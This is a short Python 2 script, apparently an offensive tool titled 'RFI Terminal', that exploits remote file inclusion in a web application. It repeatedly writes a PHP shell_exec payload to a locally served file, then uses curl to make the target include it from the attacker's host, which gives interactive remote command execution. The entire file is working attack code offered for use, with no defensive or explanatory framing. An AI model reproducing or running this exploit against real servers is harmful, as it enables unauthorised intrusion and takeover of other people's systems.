import os
from termcolor import colored

os.system('cls' if os.name == 'nt' else 'clear')
print colored('                                                                                                               ','red')
print colored('    _/_/_/    _/_/_/_/  _/_/_/      _/_/_/_/_/                                    _/                      _/   ','red')
print colored('   _/    _/  _/          _/            _/      _/_/    _/  _/_/  _/_/_/  _/_/        _/_/_/      _/_/_/  _/    ','red')
print colored('  _/_/_/    _/_/_/      _/            _/    _/_/_/_/  _/_/      _/    _/    _/  _/  _/    _/  _/    _/  _/     ','red')
print colored(' _/    _/  _/          _/            _/    _/        _/        _/    _/    _/  _/  _/    _/  _/    _/  _/      ','yellow')
print colored('_/    _/  _/        _/_/_/          _/      _/_/_/  _/        _/    _/    _/  _/  _/    _/    _/_/_/  _/       ','yellow')
print colored('                                                                                                               ','yellow')
print colored('                                                                                                               ','yellow')


print colored("Example: https://10.10.10.10/group.php?page=http://10.10.10.11:443/shell.php",'blue')
url = raw_input('Target: ')
print colored("\nExample: /var/www/html/shell.php",'blue')
file = raw_input('Local Shell Location: ')
print colored("Make sure to start the Python HTTP Server in the same location as the local shell.",'blue')
kill = 0
while kill == 0:
	command = raw_input('\nCommand: ')
	string = str(command)
	if string == '1':
		kill = 1
	else:
		copy = '<?php print shell_exec('+"'"+string+"'"+');?>'
		save = os.system("echo "+'"'+copy+'"'+" > "+file)
		cmd = os.system("curl --insecure "+url+"?")